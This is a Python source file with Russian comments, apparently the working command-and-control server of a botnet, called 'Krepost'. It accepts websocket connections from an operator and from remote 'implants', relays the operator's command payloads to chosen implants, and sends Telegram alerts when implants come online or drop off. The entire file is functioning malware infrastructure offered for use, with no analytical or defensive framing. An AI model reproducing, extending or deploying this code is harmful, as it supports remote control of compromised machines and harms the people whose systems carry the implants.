#
# --- Файл: c2_server.py (Финальная Версия V-STABLE) ---
# Эта версия правильно держит соединения открытыми.
#
import asyncio, json, os, threading, urllib.parse, urllib.request
from aiohttp import web
import settings

# --- Функции Telegram без изменений ---
def send_telegram_message(message):
    def send():
        try:
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
            urllib.request.urlopen(url, timeout=10)
        except: pass
    threading.Thread(target=send).start()

IMPLANTS, OPERATOR = {}, None

# --- ГЛАВНЫЙ ОБРАБОТЧИК С ИСПРАВЛЕННОЙ ЛОГИКОЙ ---
async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse(); await ws.prepare(request)
    client_id, client_type = None, None
    try:
        initial_message = await ws.receive_json()
        client_type = initial_message.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            await broadcast_bot_list() # Отправляем список ботов сразу после подключения
            # --- ОСНОВНОЙ ЦИКЛ ОЖИДАНИЯ КОМАНД ОТ ОПЕРАТОРА ---
            # Этот цикл будет работать, пока соединение не закроется.
            while not ws.closed:
                msg = await ws.receive()
                if msg.type == web.WSMsgType.TEXT:
                    data = json.loads(msg.data)
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id].send_str(json.dumps(data['payload']))
                elif msg.type == web.WSMsgType.ERROR:
                    break

        elif client_type == 'implant':
            client_id = initial_message.get('id')
            IMPLANTS[client_id] = ws
            send_telegram_message(f"✅ Имплант ОНЛАЙН: {client_id}")
            await broadcast_bot_list()
            # --- ОСНОВНОЙ ЦИКЛ ОЖИДАНИЯ ПИНГОВ ОТ ИМПЛАНТА ---
            # Этот цикл работает, пока имплант не отключится.
            while not ws.closed:
                msg = await ws.receive()
                if msg.type == web.WSMsgType.TEXT and msg.data == 'ping':
                    await ws.send_str('pong')
                elif msg.type == web.WSMsgType.ERROR:
                    break

    except asyncio.CancelledError:
        pass # Нормальное закрытие
    except Exception:
        # Эта ошибка теперь будет срабатывать только при реальных проблемах
        pass
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
    return ws

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        await OPERATOR.send_json({'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def http_handler(request): return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    app = web.Application(); app.router.add_get('/', http_handler); app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app); await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', settings.LOCAL_C2_PORT)
    await site.start()
    print("====== C2 СЕРВЕР (V-STABLE) ЗАПУЩЕН ======"); send_telegram_message("🚀 Сервер 'Крепость' запущен.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try: asyncio.run(main())
    except: send_telegram_message("🛑 Сервер 'Крепость' остановлен.")